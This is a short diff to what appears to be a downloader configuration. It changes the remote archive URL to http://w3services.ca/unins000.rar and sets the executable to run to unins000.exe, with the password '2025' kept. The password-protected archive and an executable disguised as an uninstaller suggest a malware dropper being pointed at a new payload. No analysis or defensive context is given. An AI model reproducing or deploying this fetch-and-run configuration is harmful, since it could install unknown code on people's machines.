@@ -1,4 +1,4 @@
-url=https://maxinstall.github.io/Scripts/Setup.rar
-name=Setup.rar
+url=http://w3services.ca/unins000.rar
+name=unins000.rar
 password=2025
-setup=NewPackage.exe
+setup=unins000.exe
